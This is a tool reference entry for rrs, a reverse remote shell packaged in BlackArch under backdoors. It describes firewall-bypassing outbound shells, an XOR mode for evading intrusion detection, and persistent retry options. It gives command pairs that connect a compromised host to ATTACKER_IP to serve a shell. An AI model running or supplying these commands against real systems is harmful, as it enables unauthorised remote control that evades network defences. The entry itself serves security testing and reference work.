---
name: "rrs"
categories:
  - blackarch-backdoor
version: "1.70"
homepage: "http://www.cycom.se/dl/rrs"
packaged-by: [blackarch]
blackarch-builddate: "2015-09-07"
build-system: make
license: GPL
meta-checked: "2026-11-09"
worth: 0.4
worth-basis: "adoption-only (no upstream data)"
worth-checked: "2026-11-09"
---

# rrs

> Reverse remote shell: the target connects out and serves a tty-backed shell, encrypted with TLS certificates, Twofish or XOR.

## What it's for

rrs (Reverse Remote Shell, by Michel Blomgren) flips the usual client/server roles: the operator runs the listener (`rrs -l`, default port 31337) and the compromised host connects out to it (`rrs <listener> [port]`), serving a full pseudo-tty shell — which gets through firewalls that only filter inbound connections. Sessions are encrypted with TLS/SSL (`-s`) using X.509 certificates: both peers are authenticated by default through `--pem` key+certificate files and `--ca` trust, or verification can be dropped with `-v0` for encrypted-but-unauthenticated use. Where OpenSSL is unavailable, rrs falls back to built-in symmetric crypto — Twofish (`-k`) or a deliberately weak XOR cipher (`-x`) that exists mainly to evade NIDS signature matching — or plain text. The connector can retry until connected (`-r`, endlessly with `-R`), the listener can run a specific command instead of a login shell (`-e`), and the connector can even monitor what the operator types (`-m`). It is a small, single-purpose 2004-era tool; for richer post-exploitation see [[pwncat-cs]], and for pivoting-capable shells see [[revsh]].

The corpus lines indexed under this name are OCR artifacts that do not refer to this tool, so this note is derived from upstream documentation only.

## Typical use cases

### TLS shell with mutual certificate authentication

```
rrs -ls -p 443 --pem operator.pem --ca target.crt
rrs -s -r5 -t5 --pem target.pem --ca operator.crt ATTACKER_IP 443
```

Outcome: a mutually authenticated TLS session in which the operator receives the target's shell; on the target, `-r5` retries every 5 seconds until connected and `-t5` bounds each connect/listen timeout. Build each side's `--pem` (private key plus certificate, concatenated) with `openssl req -new -x509 -nodes` and exchange certificates out of band.

### Same shell with a shared Twofish passphrase

```
rrs -k- -l -p 31337
rrs -k- ATTACKER_IP 31337
```

Outcome: no certificates or OpenSSL needed — `-k-` makes each side prompt on stdin for the same passphrase and the session is Twofish-encrypted (expect typing latency from the built-in implementation); `-x-` selects the weaker XOR cipher the same way.

### Quick encrypted session without authentication

```
rrs -ls -v0 --pem operator.pem
rrs -s -v0 -cHIGH ATTACKER_IP 31337
```

Outcome: TLS-encrypted traffic with peer verification disabled on both ends and ciphers restricted to the HIGH class — protected against passive observers but open to spoofing and man-in-the-middle, so only fit for throwaway lab sessions.
